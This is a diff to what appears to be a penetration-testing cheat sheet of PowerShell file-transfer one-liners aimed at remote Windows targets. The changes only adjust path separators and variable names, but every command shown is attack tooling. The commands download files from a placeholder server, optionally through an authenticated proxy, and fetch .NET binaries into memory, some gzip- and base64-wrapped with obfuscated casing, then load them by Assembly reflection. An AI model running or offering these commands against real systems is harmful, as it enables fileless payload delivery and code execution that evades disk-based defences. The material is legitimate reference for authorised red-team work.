@@ -5,19 +5,18 @@
 #plateform/windows #target/remote #cat/UTILS/FILE_TRANSFERT #tag/powershell 
 
 
-
 ## file transfert - download on disk (csharp)
 ```powershell
-(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<windows_writable_path>/<dest_file>')
+(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<windows_writable_path>\<dest_file>')
 ```
 ## file transfert - proxied download on disk (csharp)
 ```powershell
-$w=New-Object System.Net.WebClient; $w.Proxy=New-Object System.Net.WebProxy("http://<proxy_server>:<proxy_port>",$true); $w.proxy.Credentials = New-Object System.Net.NetworkCredential("<proxy_login>", "<proxy_password>"); $w.DownloadFile('http://<server>/<source_file>','<windows_writable_path>/<dest_file>')
+$w=New-Object System.Net.WebClient; $w.Proxy=New-Object System.Net.WebProxy("http://<proxy_server>:<proxy_port>",$true); $w.proxy.Credentials = New-Object System.Net.NetworkCredential("<proxy_login>", "<proxy_password>"); $w.DownloadFile('http://<server>/<source_file>','<windows_writable_path>\<dest_file>')
 ```
 
 ## file transfert - download on disk (powershell)
 ```powershell
-Invoke-WebRequest -URI http://<server>/<source_file> -Out <windows_writable_path>/<dest_file>
+Invoke-WebRequest -URI http://<server>/<source_file> -Out <windows_writable_path>\<dest_file>
 ```
 
 ## file transfert - proxied download on disk (powershell)
@@ -47,12 +46,12 @@ Invoke-WebRequest -URI http://<server>/<script> -Proxy http://<proxy_server>:<pr
 
 ## file transfert - download csharp into memory (Assembly reflection)
 ```powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>'); $asm = [System.Reflection.Assembly]::Load($data); 
+$d = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>'); $asm = [System.Reflection.Assembly]::Load($d); 
 ```
 
 ## file transfert - download gziped csharp into memory (Assembly reflection)
 ```powershell
-$compressed = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>');$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($compressed));$decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$asm = [System.Reflection.Assembly]::Load($decompressed); 
+$b64 = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>');$c=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($b64));$d = New-Object IO.Compression.GzipStream($c,[IO.Compression.CoMPressionMode]::DEComPress);$asm = [System.Reflection.Assembly]::Load($d); 
 ```
 
 ## file transfert - run csharp from memory (Assembly reflection) 
